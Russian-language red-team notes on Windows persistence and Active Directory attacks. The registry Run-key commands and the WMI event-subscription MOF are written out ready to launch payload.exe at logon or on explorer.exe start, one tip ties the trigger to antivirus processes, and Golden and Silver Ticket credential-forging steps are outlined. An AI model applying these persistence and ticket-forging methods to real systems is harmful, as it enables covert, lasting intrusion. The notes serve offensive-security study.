## 1) Registry Run Keys

Выполнение скрипта каждый раз при логине
- Конкретного пользователя
```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
 
reg add "HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
```

- Любого пользователя
```powershell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v payload /t REG_SZ /d "C:\tmp\payload.dll"
 
reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v payload /t REG_SZ /d “C:\tmp\payload.exe”
```

## 3) WMI Permanent event subscription

_WMI event subscription_ или подписка _WMI_ — это механизм, позволяющий выполнять что-либо при наступлении какого-либо события

```c
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
instance of CommandLineEventConsumer as $Cons
{
    Name = "Ioann";
    RunInteractively=false;
    CommandLineTemplate="payload.exe";
};
instance of __EventFilter as $Filt
{
    Name = "Ioann";
    EventNamespace = "root\\subscription";
    Query ="SELECT * FROM __InstanceCreationEvent Within 3"
            "Where TargetInstance Isa \"Win32_Process\" "
            "And Targetinstance.Name = \"explorer.exe\" ";
    QueryLanguage = "WQL";
};
instance of __FilterToConsumerBinding
{ 
     Filter = $Filt;
     Consumer = $Cons;
};
```

Первый блок отвечает за триггер. Я решил указать процесс, который создаётся каждый раз при логине + открытии проводника. Т.к. эти операции довольно часто производятся пользователями — это хороший пример тригера. В сети можно найти примеры с тригерами типа _cmd.exe_ или _powershell.exe_; такие примеры тоже хороши, но не так часто срабатывают относительно _explorer.exe_.

Второй блок отвечает за то, что будет вызвано при старте процесса _explorer.exe_. Переменная _Query_ — это то, что будет передаваться в _WMI_. 
[_InstanceCreationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancecreationevent) — это класс _WMI_ для новых процессов (т.е. создания процессов, этот вариант не является единственным). Например, ___InstanceDeletionEvent_ при заверщении процесса. Такой тригер хорошо использовать при завершении процессов антивирусов, например _avp.exe_.  
_Within 3_ — каждые 3 секунды для нового инстанса класса _Win32_process_.

Третий блок отвечает за связанность между триггером и необходимым действием.

После создания такого файла, необходимо его «применить». Для таких целей потребуется утилита [mofcomp.exe](https://docs.microsoft.com/en-us/windows/win32/wmisdk/mofcomp). Строка довольно примитивная: `mofcomp.exe \TEMP\filename.mof`.
## 4) Golden ticket

**[[Golden Ticket]]** или золотой билет — атака на _Active Directory_, нацеленная на компрометацию служебной УЗ _krbtgt_ (учётка, которая «выдает» билеты _Kerberos_). В случае успешной атаки, можно выдавать себе какие угодно билеты, вне зависимости от смены пароля (можно хоть 100 раз сменить пароль доменного админа, но ему все равно нужны будут билеты _Kerberos_ для получения доступа, а значит, это никак не спасёт, ведь мы сами себе выдаём любые билеты, исключение — двойная смена пароля уз _krbtgt_, в таком случае ваш золотой билет превращается в тыковку).  
Какие этапы необходимо пройти, чтобы получить такой заветный билет?

- Получить первоначальный доступ в инфраструктуру.
- Найти и получить УЗ, которая имеет права администратора на контроллере домена.
- Сдампить на контроллере домена (любом) хеш пароля _krbtgt_ любым доступным методом (_mimikatz_, дамп _ntds.dit_ и др.).
- Использовать полученный хеш для получения заветного билета.
## 5) Silver ticket

Рассмотрим этапы проведения атаки _Silver ticket_:

1. Получить первоначальный доступ в инфраструктуру.
2. Провести разведку с целью получения имени и _SID_ пользователя.
3. Получить контроль над _DNS_ именем, под которым работает сервис, его _SPN_ (_service principal name_). Сюда можно отнести и УЗ компьютера (те, что заканчиваются на `$`).
4. Дамп _NTLM_ хеша сервисной УЗ (например, _SPN_ для _MS SQL_, которая использует доменную аутентификацию).
5. Расшифровать _NTLM_ хеш. Это не всегда простая задача, поэтому как дополнительную меру можно использовать атаку [kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting).
6. После получения пароля в открытом виде следует выпустить себе _TGS_ для аутентификации на сервисе.
7. Пройти аутентификацию на сервисе, используя созданный _TGS_.
8. Пробовать играться с _TGS_, чтобы поднять права в домене до уровня администратора.
